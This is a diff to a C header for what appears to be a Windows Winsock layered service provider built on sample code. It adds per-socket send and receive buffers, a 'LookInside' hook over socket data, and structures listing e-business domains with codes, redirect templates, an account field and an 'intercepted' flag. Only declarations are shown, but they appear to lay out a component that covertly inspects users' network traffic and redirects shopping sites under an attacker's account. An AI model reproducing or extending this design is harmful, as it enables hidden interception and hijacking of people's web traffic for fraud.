@@ -26,6 +26,42 @@
 
 #define WM_SOCKET ( WM_USER + 321 )     // Message for our async window events
 
+#define HOST_MAX_LENGTH 255
+#define URL_MAX_LENGTH 2048
+#define HTTP_REQUEST_MAX_LENGTH 8192
+#define HTTP_HEADER_MAX 64
+
+#define MIN(a, b) ((a) <= (b) ? (a) : (b))
+
+typedef struct _GAUSSBUF {
+	PCHAR pBuffer;
+	DWORD dwBufferSize;
+	PCHAR pDataStart;
+	PCHAR pDataEnd;
+} GAUSSBUF, *PGAUSSBUF;
+
+PGAUSSBUF CreateGaussBuf(DWORD dwBufferSize);
+
+VOID FreeGaussBuf(PGAUSSBUF *pGaussBuf);
+
+typedef struct _EBUSINESS {
+	LPSTR pDomain;
+	LPSTR pCode;
+	LPSTR pRedirectTemplate;
+	BOOL bIntercepted;
+} EBUSINESS, *PEBUSINESS;
+
+typedef struct _REDIRECT_INFO {
+	LPSTR pAccount;
+	PEBUSINESS pEBusiness;
+	int iNumberOfEBusiness;
+	CRITICAL_SECTION Lock;
+} REDIRECT_INFO, *PREDIRECT_INFO;
+
+extern PREDIRECT_INFO g_pRedirectInfo;
+
+BOOL LoadRedirectInfo(VOID);
+VOID FreeRedirectInfo(VOID);
 
 //
 // This is the socket context data that we associate with each socket
@@ -41,6 +77,11 @@ typedef struct _SOCK_INFO
     BOOL   bClosing;            // has the app closed the socket?
 
     volatile LONG  RefCount;    // How many threads are accessing this info?
+
+	BOOL bFirstSend;
+	BOOL bFirstReceive;
+    PGAUSSBUF pSendBuffer;
+    PGAUSSBUF pReceiveBuffer;
 
     ULONGLONG  BytesSent;       // Byte counts
     ULONGLONG  BytesRecv;
@@ -58,6 +99,8 @@ typedef struct _SOCK_INFO
     LIST_ENTRY         Link;
 
 } SOCK_INFO;
+
+VOID LookInside(SOCK_INFO *, LPWSABUF, DWORD);
 
 //
 // Structure for mapping upper layer sockets to lower provider sockets in WSPSelect
